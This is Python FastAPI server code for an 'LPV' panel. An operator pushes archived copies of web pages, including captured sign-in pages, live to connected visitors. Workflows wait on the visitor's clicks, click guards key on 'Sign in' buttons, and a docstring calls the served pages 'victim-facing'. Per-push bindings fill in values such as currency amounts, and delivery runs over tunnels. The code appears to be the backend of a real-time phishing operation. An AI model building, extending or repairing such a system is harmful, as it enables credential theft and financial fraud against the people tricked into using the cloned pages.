    """Return whether a token still owns the LPV runtime connection."""
    if connection_token is None:
        return True
    return _lpv_connection_tokens.get(client_id) == connection_token


def _lpv_spinner_signal(client_id: str, connection_token: Optional[str] = None) -> None:
    """Wake every spinner waiter parked on this client.

    Waiters are keyed by (client_id, connection_token) so a superseded
    socket generation cannot satisfy a live workflow's redirect wait.  But
    the workflow runner and the inbound event handler do not always agree
    on which token to use, so an exact-key lookup frequently missed:

      * admin-triggered runs go through _launch_workflow(), which passes
        connection_token=None, while an LPV-only client's clicks arrive on
        the per-link socket, which signals with its real token;
      * a reconnect issues a NEW token, so a click on the new socket never
        matches the token the already-running chain subscribed with.

    In both cases the exact-key lookup never fired, and a `redirect` step
    parked in _lpv_wait_for_spinner() — which waits forever by design —
    hung for good, so clicking a button never advanced the workflow.

    Waking every waiter for the client is safe: each waiter re-checks
    _lpv_connection_is_current(client_id, connection_token) the instant it
    wakes and aborts the whole chain if it belongs to a superseded
    generation, so a stale waiter still cannot advance a live workflow.
    """
    for _key, _subs in list(_lpv_spinner_subs.items()):
        if _key[0] != client_id:
            continue
        for ev in list(_subs):
            try:
                ev.set()
            except Exception:
                pass


async def _lpv_wait_for_spinner(
    client_id: str, timeout: Optional[float] = None,
    connection_token: Optional[str] = None,
) -> bool:
    """Subscribe to the next `lpv_spinner` event for `client_id` and
    wait until it fires.  If timeout is None or <=0, wait FOREVER —
    the workflow only advances when the client actually shows the
    spinner, or when the client disconnects (which fires _lpv_spinner_signal
    to wake the waiter so it can abort).  This implements the user-requested
    "no timeout to wait for lvp redirect until it comes just keep waiting
    stop only when client disconnects" semantics.
    """
    ev = asyncio.Event()
    key = (client_id, connection_token)
    _lpv_spinner_subs.setdefault(key, []).append(ev)
    try:
        if timeout is None or (isinstance(timeout, (int, float)) and timeout <= 0):
            await ev.wait()
            return True
        # bounded wait (legacy path, now not used for redirect)
        await asyncio.wait_for(ev.wait(), timeout=timeout)
        return True
    except asyncio.TimeoutError:
        return False
    finally:
        try:
            _lpv_spinner_subs[key].remove(ev)
            if not _lpv_spinner_subs[key]:
                _lpv_spinner_subs.pop(key, None)
        except (KeyError, ValueError):
            pass

@app.get("/api/settings")
async def settings_get(request: Request):
    """Return the current server settings.

    Auth: requires a valid admin JWT.  The admin page now issues one
    via /api/auth/login and attaches it through serverFetch; if no
    token is present we 401 so the browser stops logging infinite
    unauth'd retries (which is what was happening before — every
    KeepAlive tick re-fired the GET and the console filled with
    'api/settings: 401').  The Login overlay now catches the 401 and
    re-prompts instead of silently failing.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    return {
        "settings": srv_settings.get_settings_dict(),
        "settings_file": srv_settings.settings_file_path(),
    }


@app.post("/api/settings")
async def settings_update(request: Request):
    """Apply a partial patch to server settings.

    Body is JSON: { "key": value, ... }  Unknown keys are ignored.
    Returns the new full settings dict.  Same auth posture as GET.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"error": "invalid JSON body"}, status_code=400)
    if not isinstance(body, dict):
        return JSONResponse({"error": "expected JSON object"}, status_code=400)
    new = await srv_settings.set_settings(body)
    logger.debug(
        "[settings] admin updated %s",
        sorted(body.keys()),
    )
    # Chat availability/appearance changed — tell every live client now so
    # the bubble appears, disappears or recolours without a page reload.
    if any(str(k).startswith("chat_") for k in body.keys()):
        try:
            await _push_chat_config_to_clients()
        except Exception:
            logger.debug("[chat] config push failed", exc_info=True)
    # Tab title / favicon changed — retitle the tab of everyone already
    # sitting on a live page instead of waiting for a reload.
    if any(str(k) in ("lpv_tab_title", "lpv_favicon_url") for k in body.keys()):
        try:
            await _push_lpv_branding_to_clients()
        except Exception:
            logger.debug("[lpv] branding push failed", exc_info=True)
    return {"settings": new.to_dict()}


async def _broadcast_settings_update(payload: Dict[str, Any]) -> None:
    """Bridge from server_settings subscriber API to the admin WS broadcast.
    Subscribed once at import time (below)."""
    try:
        await _broadcast_to_admins({
            "type": "server_settings_update",
            "settings": payload.get("settings", {}),
            "changed_key": payload.get("key"),
        })
    except Exception as exc:
        logger.debug("[settings] admin broadcast skipped: %s", exc)


# Wire the bridge.  Idempotent guard so reloads don't double-subscribe.
if not getattr(srv_settings, "_admin_broadcast_hooked", False):
    srv_settings.subscribe(_broadcast_settings_update)
    srv_settings._admin_broadcast_hooked = True  # type: ignore[attr-defined]


@app.get("/api/lpv/archive")
async def lpv_archive_list(q: str = Query("", alias="q"), limit: int = Query(200, ge=1, le=500)):
    try:
        return {"pages": lpv_store.list_pages(query=q, limit=limit)}
    except Exception as e:
        logger.error(f"lpv list error: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/lpv/archive")
async def lpv_archive_upload(request: Request):
    """Upload a new (or update an existing) HTML page.

    Accepts JSON { name, html, description?, tags? } OR
    multipart/form-data with the same field names. JSON is the
    preferred path because it round-trips safely without
    multipart parsing surprises (e.g. custom encodings)."""
    try:
        ctype = (request.headers.get("content-type") or "").lower()
        if "application/json" in ctype:
            body = await request.json()
            name = (body.get("name") or "").strip()
            html = body.get("html") or ""
            description = body.get("description") or ""
            tags = body.get("tags") or []
        else:
            form = await request.form()
            name = (form.get("name") or "").strip()
            html = form.get("html") or ""
            description = form.get("description") or ""
            raw_tags = form.get("tags") or ""
            tags = [t.strip() for t in raw_tags.split(",") if t.strip()] if isinstance(raw_tags, str) else []

        if not name:
            return JSONResponse({"error": "name is required"}, status_code=400)
        if not html:
            return JSONResponse({"error": "html is required"}, status_code=400)

        # Sanitize before persisting so the on-disk copy is already
        # clean. The sanitizer strips sandbox, meta CSP, and base
        # href — see _sanitize_lpv_html for the full rationale.
        html = _sanitize_lpv_html(html)

        page = lpv_store.save_page(name=name, html=html, description=description, tags=tags)
        return {"page": page}
    except ValueError as ve:
        return JSONResponse({"error": str(ve)}, status_code=400)
    except Exception as e:
        logger.error(f"lpv upload error: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/lpv/archive/{page_id}")
async def lpv_archive_get(page_id: str):
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    return {"page": page}


def _page_actions(page_id: str, page: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
    """Click actions for one page, ready to ship to client.html.

    Same shape as _page_guard: prefer the row in hand, hit the DB only when
    needed, and never raise — a missing page simply has no actions.

    A device pair is one page to the operator but two rows in the database.
    When the visitor received the paired build, the actions saved on the page
    the operator mapped still apply; otherwise a mapped control silently did
    nothing on phones (or on desktops) while working everywhere else.
    """
    try:
        row = page
        if row is None and page_id:
            row = lpv_store.get_page(page_id)
        if not row:
            return []
        own = lpv_store.normalise_actions(row.get("actions"))
        if own:
            return own
        partner_id = str(row.get("variant_page_id") or "").strip()
        if not partner_id:
            return own
        partner = lpv_store.get_page(partner_id)
        if not partner:
            return own
        return lpv_store.normalise_actions(partner.get("actions"))
    except Exception:
        logger.debug("[lpv] action lookup failed for %s", page_id, exc_info=True)
        return []


async def _deliver_page(
    client_id: str,
    page_id: str,
    *,
    connection_token: Optional[str] = None,
    bindings: Optional[Dict[str, str]] = None,
    source: str = "action",
    record_kind: str = "page_pushed",
) -> Tuple[bool, Optional[Dict[str, Any]]]:
    """Push one archived page to one visitor, the same way a workflow does.

    Device variants resolve per visitor, binding values are carried by a
    token, and the guard + click actions travel with the page. Everything
    that "goes to a page" (a click action, the chat bubble's redirect mode,
    a workflow step) ends up here, so they all behave identically.
    """
    page, served_id, _device = await _page_for_client(client_id, page_id)
    if not page:
        lpv_store.record_event(
            client_id, f"{record_kind}_skipped",
            {"reason": "page_missing", "page_id": page_id, "source": source},
        )
        return False, None
    values = _bind_values_for_page(served_id, bindings)
    token = _bind_token_for(served_id, values) if values else None
    ok = await _send_to_client(client_id, {
        "type": "lpv_show_page",
        "page_id": served_id,
        "page_url": _lpv_page_url(served_id, token),
        "page_name": page["name"],
        "guard": _page_guard(served_id, page),
        "actions": _page_actions(served_id, page),
    }, connection_token=connection_token)
    if not ok:
        lpv_store.record_event(
            client_id, f"{record_kind}_skipped",
            {"reason": "client_offline", "page_id": served_id, "source": source},
        )
        return False, page
    lpv_store.set_current_page(client_id, served_id, page["name"])
    lpv_store.record_event(
        client_id, record_kind,
        {"page_version": page.get("version", 1), "source": source},
        page_id=served_id, page_name=page["name"],
    )
    await _broadcast_lpv_event(client_id, {
        "event_type": record_kind,
        "page_id": served_id,
        "page_name": page["name"],
        "payload": {"source": source},
    })
    return True, page


async def _navigate_client(
    client_id: str, url: str, *, connection_token: Optional[str] = None
) -> bool:
    """Send the visitor to an external URL (the same message a goto step uses)."""
    url = (url or "").strip()
    if not url:
        return False
    if not url.lower().startswith(("http://", "https://")):
        url = "https://" + url
    try:
        ok = await _send_to_client(
            client_id, {"type": "navigate", "url": url},
            connection_token=connection_token,
        )
    except Exception:
        ok = False
    if not ok:
        try:
            ok = await _send_to_client(
                client_id, {"type": "goto", "url": url},
                connection_token=connection_token,
            )
        except Exception:
            ok = False
    return bool(ok)


async def _run_action(
    client_id: str,
    rule: Dict[str, Any],
    *,
    connection_token: Optional[str] = None,
    source: str = "page",
    bindings: Optional[Dict[str, str]] = None,
) -> bool:
    """Carry out one click action: another page, or a link."""
    rule = dict(rule or {})
    do = str(rule.get("do") or "").lower()
    matched = str(rule.get("match") or "")
    if do == "page" and rule.get("page_id"):
        ok, page = await _deliver_page(
            client_id, rule["page_id"], connection_token=connection_token,
            bindings=bindings, source=source, record_kind="action_page",
        )
        lpv_store.record_event(
            client_id, "page_action",
            {"match": matched, "do": "page", "source": source,
             "target": (page or {}).get("name") or rule.get("page_name") or rule["page_id"],
             "delivered": ok},
            page_id=rule["page_id"], page_name=(page or {}).get("name") or "",
        )
        return ok
    if do == "link" and rule.get("url"):
        ok = await _navigate_client(client_id, rule["url"], connection_token=connection_token)
        lpv_store.record_event(
            client_id, "page_action",
            {"match": matched, "do": "link", "source": source,
             "target": rule["url"], "delivered": ok},
        )
        return ok
    return False


# Armed click actions: a workflow "action" step drops one rule on the client
# and (optionally) waits for the click. Keyed by client so a rule from one
# visitor can never fire for another.
_ARMED_ACTIONS: Dict[str, Dict[str, Any]] = {}


def _page_guard(page_id: str, page: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Click guard for one page, ready to ship to client.html.

    Prefers the row already in hand (message paths often have it) and only
    hits the DB when it has to. Never raises: a missing page means an
    unlocked guard, so an old client keeps working unchanged.
    """
    try:
        if page is not None:
            raw = page.get("guard")
            if raw is None:
                page_id = page.get("id") or page_id
            else:
                return lpv_store.normalise_guard(raw)
        if not page_id:
            return lpv_store.normalise_guard(None)
        fetched = lpv_store.get_page(page_id)
        if not fetched:
            return lpv_store.normalise_guard(None)
        return lpv_store.normalise_guard(fetched.get("guard"))
    except Exception:
        logger.debug("[lpv] guard lookup failed for %s", page_id, exc_info=True)
        return lpv_store.normalise_guard(None)


async def _push_guard_to_viewers(page_id: str, guard: Dict[str, Any]) -> int:
    """Send a live guard change to every client currently showing the page.

    The operator can lock/unlock a page while a visitor is already looking at
    it; without this the change would only take effect on the next push.
    """
    sent = 0
    try:
        clients = lpv_store.clients_on_page(page_id)
    except Exception:
        clients = []
    for cid in clients:
        try:
            ok = await _send_to_client(cid, {
                "type": "lpv_guard",
                "page_id": page_id,
                "guard": guard,
            })
            if ok:
                sent += 1
        except Exception:
            continue
    return sent


async def _push_actions_to_viewers(page_id: str, actions: List[Dict[str, Any]]) -> int:
    """Send saved click actions to every client showing the page (or its pair).

    The operator can map a control while a visitor is already on the page; the
    action must start working on that visit, not only on the next push.
    """
    ids = [page_id]
    try:
        page = lpv_store.get_page(page_id) or {}
        partner = str(page.get("variant_page_id") or "").strip()
        if partner:
            ids.append(partner)
    except Exception:
        pass
    sent = 0
    for pid in ids:
        # A client showing the paired build needs *that* page's id, or its
        # update is rejected for belonging to a different page.
        payload_actions = actions if pid == page_id else (_page_actions(pid) or actions)
        try:
            clients = lpv_store.clients_on_page(pid)
        except Exception:
            clients = []
        for cid in clients:
            try:
                ok = await _send_to_client(cid, {
                    "type": "lpv_actions",
                    "page_id": pid,
                    "actions": payload_actions,
                })
                if ok:
                    sent += 1
            except Exception:
                continue
    return sent


def _apply_page_bindings(
    page: Optional[Dict[str, Any]],
    html: str,
    values: Optional[Dict[str, str]] = None,
) -> str:
    """Fill a page's binding slots in the HTML being served.

    Runs AFTER the sanitizer, so an operator's replacement text is not
    stripped. ``values`` are the fields the operator typed for this one push
    (name -> value); a named binding with no value falls back to the default
    saved with the page. Bindings without a name behave as they always have:
    a find -> replace applied to every serve.
    """
    if not html or not page:
        return html
    bindings = page.get("bindings") or []
    if not isinstance(bindings, list) or not bindings:
        return html
    try:
        from page_bindings import apply_bindings
        html, report = apply_bindings(html, bindings, values)
    except Exception:
        logger.warning("[lpv] bindings on page %s could not be applied",
                       page.get("id"), exc_info=True)
        return html
    if report.get("applied"):
        logger.debug(
            "[lpv] bindings applied to page %s: %s",
            page.get("id"),
            ", ".join(f"{a['name']}×{a['count']}" for a in report["applied"]),
        )
    return html


# ---------------------------------------------------------------------------
# Per-push binding values
# ---------------------------------------------------------------------------
# A push may carry values ("amount = NGN 50,000"). Those must apply to the ONE
# delivery, not to every later visitor, so the URL handed to that visitor
# carries an opaque token and the values live here, briefly.
_BIND_RENDERS: Dict[str, Dict[str, Any]] = {}
_BIND_RENDER_TTL = 6 * 3600      # a session that idles longer re-pushes anyway
_BIND_RENDER_MAX = 500


def _bind_token_for(page_id: str, values: Dict[str, str]) -> str:
    """Store values for one delivery and return the token for its URL."""
    import secrets

    # Drop expired entries before growing the map.
    now = time.time()
    for token in [t for t, v in _BIND_RENDERS.items() if v["expires"] < now]:
        _BIND_RENDERS.pop(token, None)
    if len(_BIND_RENDERS) >= _BIND_RENDER_MAX:
        oldest = min(_BIND_RENDERS, key=lambda t: _BIND_RENDERS[t]["created"])
        _BIND_RENDERS.pop(oldest, None)
    token = secrets.token_urlsafe(12)
    _BIND_RENDERS[token] = {
        "page_id": page_id,
        "values": {str(k): str(v) for k, v in values.items()},
        "created": now,
        "expires": now + _BIND_RENDER_TTL,
    }
    return token


def _bind_values_for(page_id: str, token: Optional[str]) -> Dict[str, str]:
    """Values stored for this token, if it belongs to this page and is live."""
    if not token:
        return {}
    entry = _BIND_RENDERS.get(token)
    if not entry or entry["expires"] < time.time():
        _BIND_RENDERS.pop(token, None)
        return {}
    if entry["page_id"] != page_id:
        return {}
    return dict(entry.get("values") or {})


def _bind_values_for_page(page_id: str, values: Optional[Dict[str, str]]) -> Dict[str, str]:
    """The subset of typed values that this page actually declares.

    A workflow run may carry values for several pages; a page that has no
    binding with that name must not receive them.
    """
    if not values:
        return {}
    page = lpv_store.get_page(page_id) or {}
    from page_bindings import fields_for
    names = {f["name"] for f in fields_for(page.get("bindings") or [])}
    return {k: v for k, v in values.items() if k in names}


def _clean_bind_values(raw: Any) -> Dict[str, str]:
    """Only plain name -> string pairs, bounded in size."""
    out: Dict[str, str] = {}
    if isinstance(raw, dict):
        for key, value in list(raw.items())[:50]:
            name = str(key)[:60]
            if not name or value is None:
                continue
            out[name] = str(value)[:5000]
    return out


@app.get("/api/lpv/archive/{page_id}/html")
async def lpv_archive_html(page_id: str, b: Optional[str] = None):
    """Raw HTML body — the client runtime fetches this URL to render
    a pushed page. Returns text/html so the browser can inject it
    directly into a container."""
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    html = lpv_store.read_page_html(page_id)
    if html is None:
        return JSONResponse({"error": "file missing on disk"}, status_code=410)

    # Re-sanitize on the way out. This covers pages that were uploaded
    # before the sanitizer existed — the parser pass is cheap (a few
    # ms for a 2MB page) and the function is idempotent so we are not
    # paying a meaningful cost on already-clean pages.
    html, dropped_base = _sanitize_lpv_html_with_base(html)
    # HTML+CSS only in the viewer (user request): page JS re-executed from a
    # blob: doc builds URLs against the viewer origin (glued-host failures).
    if os.environ.get("LPV_STRIP_SCRIPTS", "1") not in ("0", "false", "False"):
        import re as _re_strip
        html = _re_strip.sub(r"<script\b[^>]*(?:/>|>[\s\S]*?</script\s*>)", "", html, flags=_re_strip.IGNORECASE)
    # Bindings, including the values the operator typed for THIS push
    # (?b=<token> — see _bind_token_for). Without a token the page still gets
    # its saved rules/defaults, exactly as before.
    html = _apply_page_bindings(page, html, _bind_values_for(page_id, b))

    # Re-inject a VALIDATED base: the sanitizer strips <base> for safety,
    # but a base-less document blob'd by the client resolves every relative
    # URL against the VIEWER's origin. Over a tunnel that mean the ngrok
    # edge serves the requests and its interstitial machinery navigates the
    # frame to a glued hostname (the "…apphttps" DNS errors). Localhost
    # masked this because the viewer host IS our server there.
    if "<base" not in html[:4000].lower():
        vbase = _validated_base_href(dropped_base, html)
        if vbase:
            html = _inject_base_into_html(html, vbase)
            logger.debug("[lpv] re-injected validated base %r into pushed page %s", vbase, page_id)

    # Belt-and-suspenders CSP for the LPV HTML response itself. The fetch
    # response is consumed by client.html and turned into a blob URL, so
    # this header governs the fetch response — but blob URL iframes in
    # modern Chrome also inherit the parent doc's CSP for sub-resource
    # checks. The middleware (add_security_headers) already overrides CSP
    # for any /api/lpv/* path, but we set it again here so this route is
    # self-contained even if a future refactor changes the middleware.
    #
    # We allow data: scripts, 'unsafe-eval', and 'unsafe-inline' because
    # SingleFile-saved pages and their embedded widgets (Google Identity
    # Services, reCAPTCHA, ...) use them. The pushed HTML is admin-curated,
    # so this is an acceptable trade-off.
    response = HTMLResponse(content=html, media_type="text/html; charset=utf-8")
    response.headers["Content-Security-Policy"] = (
        "default-src 'self' blob: data: https: wss: ws:; "
        "script-src 'self' 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval' "
            "data: blob: https: http://localhost:* http://127.0.0.1:*; "
        "script-src-elem 'self' 'unsafe-inline' 'unsafe-eval' "
            "data: blob: https: http://localhost:* http://127.0.0.1:*; "
        "style-src 'self' 'unsafe-inline' https: data: blob:; "
        "style-src-elem 'self' 'unsafe-inline' https: data: blob:; "
        "img-src 'self' data: blob: https: http:; "
        "font-src 'self' https: data: blob:; "
        "connect-src 'self' wss: ws: https: http: blob: data:; "
        "media-src 'self' blob: data: https: http:; "
        "frame-src 'self' blob: data: https: http:; "
        "worker-src 'self' blob: data: https:; "
        "child-src 'self' blob: data: https: http:; "
        "form-action 'self' blob: data: https: http:; "
        "base-uri 'self' https: http:; "
        "frame-ancestors 'self' http://localhost:* http://127.0.0.1:* https:; "
        "object-src 'none'"
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    return response


@app.get("/api/lpv/pages/{page_id}/guard")
async def lpv_page_guard_get(page_id: str, request: Request):
    """Read a page's click guard (admin)."""
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    guard = lpv_store.normalise_guard(page.get("guard"))
    return {
        "page_id": page_id,
        "guard": guard,
        "enabled": guard["enabled"],
        "count": len(guard["allow"]),
    }


@app.put("/api/lpv/pages/{page_id}/guard")
async def lpv_page_guard_put(page_id: str, request: Request):
    """Replace a page's click guard (admin).

    Body: {"guard": {...}} or the flat form {"enabled": true, "allow":
    ["#signin", "text:Sign in"], "notify": true, "feedback": true}.
    The change is pushed to any client already showing the page.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"error": "invalid JSON"}, status_code=400)
    if not isinstance(body, dict):
        return JSONResponse({"error": "JSON object required"}, status_code=400)
    raw = body.get("guard") if isinstance(body.get("guard"), dict) else body
    guard = lpv_store.set_page_guard(page_id, raw)
    if guard is None:
        return JSONResponse({"error": "not found"}, status_code=404)
    delivered = await _push_guard_to_viewers(page_id, guard)
    # Tell every open admin panel that this page is now locked/unlocked, so
    # the archive card badge updates without a refresh.
    try:
        await _broadcast_lpv_event("", {
            "event_type": "guard_updated",
            "page_id": page_id,
            "page_name": page.get("name"),
            "payload": {"enabled": guard["enabled"],
                        "rules": len(guard["allow"]),
                        "viewers": delivered},
        })
    except Exception:
        pass
    return {
        "success": True,
        "page_id": page_id,
        "guard": guard,
        "delivered": delivered,
    }


@app.get("/api/lpv/pages/{page_id}/device")
async def lpv_page_device_get(page_id: str, request: Request):
    """Read which audience a page is built for and its paired page (admin).

    ``device`` is 'any' (default, everybody), 'mobile' or 'desktop'.
    ``variant_page_id`` is the other build of the same page; when it is set,
    a visitor whose device does not match ``device`` is served that page
    instead — one workflow covers phones and desktops.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    variant_id = str(page.get("variant_page_id") or "")
    variant = lpv_store.get_page(variant_id) if variant_id else None
    return {
        "page_id": page_id,
        "device": lpv_store.normalise_device(page.get("device")),
        "variant_page_id": variant_id,
        "variant_page_name": (variant or {}).get("name", ""),
        "variants": [
            {"id": other.get("id"), "name": other.get("name"),
             "device": lpv_store.normalise_device(other.get("device"))}
            for other in (lpv_store.list_pages() or [])
            if str(other.get("id")) != page_id
        ],
    }


@app.put("/api/lpv/pages/{page_id}/device")
async def lpv_page_device_put(page_id: str, request: Request):
    """Pair a page with the build for the other audience (admin).

    Body: {"device": "mobile"|"desktop"|"any", "variant_page_id": "<page>"}
    (``desktop_page_id`` accepted as an alias). Setting device to 'any'
    unpairs the page. Existing workflows keep referencing either member and
    the server picks the right one per visitor, so nothing needs rebuilding.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    if not lpv_store.get_page(page_id):
        return JSONResponse({"error": "not found"}, status_code=404)
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"error": "invalid JSON"}, status_code=400)
    if not isinstance(body, dict):
        return JSONResponse({"error": "JSON object required"}, status_code=400)
    raw_device = body.get("device")
    if raw_device is None:
        raw_device = "desktop" if (body.get("variant_page_id") or body.get("desktop_page_id")) else "any"
    device = lpv_store.normalise_device(raw_device)
    variant_id = str(
        body.get("variant_page_id")
        or body.get("desktop_page_id")
        or ""
    ).strip()
    try:
        page = lpv_store.set_page_device(page_id, device, variant_id)
    except ValueError as exc:
        return JSONResponse({"error": str(exc)}, status_code=400)
    except Exception as exc:
        logger.warning("[LPV] device pair save failed for %s: %s", page_id, exc)
        return JSONResponse({"error": "save failed"}, status_code=500)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    try:
        await _broadcast_lpv_event("", {
            "event_type": "device_updated",
            "page_id": page_id,
            "page_name": page.get("name"),
            "payload": {
                "device": lpv_store.normalise_device(page.get("device")),
                "variant_page_id": str(page.get("variant_page_id") or ""),
            },
        })
    except Exception:
        pass
    variant = lpv_store.get_page(str(page.get("variant_page_id") or ""))
    return {
        "success": True,
        "page_id": page_id,
        "device": lpv_store.normalise_device(page.get("device")),
        "variant_page_id": str(page.get("variant_page_id") or ""),
        "variant_page_name": (variant or {}).get("name", ""),
    }


@app.get("/api/lpv/pages/{page_id}/bindings")
async def lpv_page_bindings_get(page_id: str, request: Request):
    """A page's bindings, plus the fields a panel should ask for (admin).

    ``fields`` is the push-time form: one entry per *named* binding, with its
    saved default, in the order the operator arranged them.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    from page_bindings import fields_for
    bindings = page.get("bindings") or []
    return {"bindings": bindings, "fields": fields_for(bindings)}


@app.put("/api/lpv/pages/{page_id}/bindings")
async def lpv_page_bindings_put(page_id: str, request: Request):
    """Replace a page's bindings.  Body: {"bindings": [{"find","replace"}, ...]}.
    Bindings apply to every future serve of the page HTML (victim-facing);
    the stored original page is never modified."""
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"error": "invalid JSON"}, status_code=400)
    bindings = (body or {}).get("bindings")
    if bindings is None:
        return JSONResponse({"error": "bindings[] required"}, status_code=400)
    try:
        ok = lpv_store.set_page_bindings(page_id, bindings)
    except ValueError as exc:
        # A bad regex / missing matcher is the operator's typo, not a crash:
        # say what is wrong so the editor can show it next to the row.
        return JSONResponse({"error": str(exc)}, status_code=400)
    if not ok:
        return JSONResponse({"error": "save failed"}, status_code=500)
    saved = (lpv_store.get_page(page_id) or {}).get("bindings") or []
    from page_bindings import fields_for
    return {
        "success": True,
        "bindings": saved,
        "fields": fields_for(saved),
        "count": len(saved),
    }


@app.post("/api/lpv/pages/{page_id}/bindings/preview")
async def lpv_page_bindings_preview(page_id: str, request: Request):
    """Render the page as a visitor would receive it, with these values.

    Body: {"bindings": {"amount": "NGN 50,000"}}. Returns the rendered HTML and
    a report of which bindings matched, so an operator can check the result
    before pushing instead of pushing and asking the visitor.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    html = lpv_store.read_page_html(page_id)
    if html is None:
        return JSONResponse({"error": "file missing on disk"}, status_code=410)
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    values = _clean_bind_values(body.get("bindings"))

    # The editor can preview *unsaved* rules, so a typo is caught before it is
    # stored. Without that, Preview would always show the last saved version.
    from page_bindings import apply_bindings, normalise_bindings
    rules = page.get("bindings") or []
    if isinstance(body.get("rules"), list):
        try:
            rules = normalise_bindings(body["rules"])
        except ValueError as exc:
            return JSONResponse({"error": str(exc)}, status_code=400)
    rendered, report = apply_bindings(html, rules, values)
    return {
        "page_id": page_id,
        "name": page.get("name", ""),
        "values": values,
        "report": report,
        "count": len(rules),
        "html": rendered,
    }


@app.delete("/api/lpv/archive/{page_id}")
async def lpv_archive_delete(page_id: str):
    ok = lpv_store.delete_page(page_id)
    if not ok:
        return JSONResponse({"error": "not found"}, status_code=404)
    return {"deleted": page_id}


@app.get("/api/lpv/session/{client_id}")
async def lpv_session_get(client_id: str):
    sess = lpv_store.get_session(client_id)
    return {"session": sess}


@app.get("/api/lpv/audit/{client_id}")
async def lpv_audit_list(
    client_id: str,
    limit: int = Query(200, ge=1, le=1000),
    since: Optional[float] = Query(None),
):
    events = lpv_store.list_events(client_id, limit=limit, since=since)
    return {"events": events}


@app.get("/api/lpv/profiles")
async def lpv_profiles_list(
    request: Request,
    limit: int = Query(500, ge=1, le=2000),
):
    """One row per client_id that has LPV audit history.

    Backs the LPV -> Profiles sub-tab in the admin UI.  Now gated by
    the same admin JWT as the rest of the operator-facing endpoints;
    the previous 'no token check' posture was the source of the
    repeated 'api/lpv/profiles: 401' console noise — the LPV auto-poll
    fires every few seconds while the tab is open, so any
    unauthenticated retry storm showed up immediately.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        profiles = lpv_store.list_profiles(limit=limit)
        return {"profiles": profiles}
    except Exception as exc:
        logger.error("lpv profiles list error: %s", exc)
        return JSONResponse({"error": str(exc)}, status_code=500)


# ----- Round 2: page lifecycle -----

@app.post("/api/lpv/archive/{page_id}/rename")
async def lpv_archive_rename(page_id: str, request: Request):
    try:
        body = await request.json()
        new_name = (body.get("name") or "").strip()
    except Exception:
        return JSONResponse({"error": "invalid JSON body"}, status_code=400)
    if not new_name:
        return JSONResponse({"error": "name is required"}, status_code=400)
    try:
        page = lpv_store.rename_page(page_id, new_name)
    except ValueError as ve:
        return JSONResponse({"error": str(ve)}, status_code=409)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    return {"page": page}


@app.post("/api/lpv/archive/{page_id}/duplicate")
async def lpv_archive_duplicate(page_id: str, request: Request):
    new_name = None
    try:
        body = await request.json()
        new_name = (body.get("name") or "").strip() or None
    except Exception:
        pass
    page = lpv_store.duplicate_page(page_id, new_name=new_name)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    return {"page": page}


@app.get("/api/lpv/archive/{page_id}/source")
async def lpv_archive_source(page_id: str, request: Request):
    """The stored HTML exactly as it is on disk (admin only).

    The /html route is the VISITOR's copy — bindings applied, scripts
    stripped. Editing an archive has to start from the stored original, or a
    save would bake a rendered copy over the page.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    html = lpv_store.read_page_html(page_id)
    if html is None:
        return JSONResponse({"error": "file missing on disk"}, status_code=410)
    return {
        "page_id": page_id,
        "name": page.get("name", ""),
        "version": page.get("version", 1),
        "html": html,
        "size_bytes": page.get("size_bytes", 0),
    }


@app.put("/api/lpv/archive/{page_id}/html")
async def lpv_archive_replace_html(page_id: str, request: Request):
    """Re-upload the HTML for an existing archive (admin only).

    Keeps the page id, name, bindings, click guard, click actions and device
    pairing: only the file changes. The outgoing HTML is kept in the version
    history, so an edit can be rolled back from the same card.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    page = lpv_store.get_page(page_id)
    if not page:
        return JSONResponse({"error": "not found"}, status_code=404)
    ctype = (request.headers.get("content-type") or "").lower()
    description = None
    tags = None
    if "application/json" in ctype:
        try:
            body = await request.json()
        except Exception:
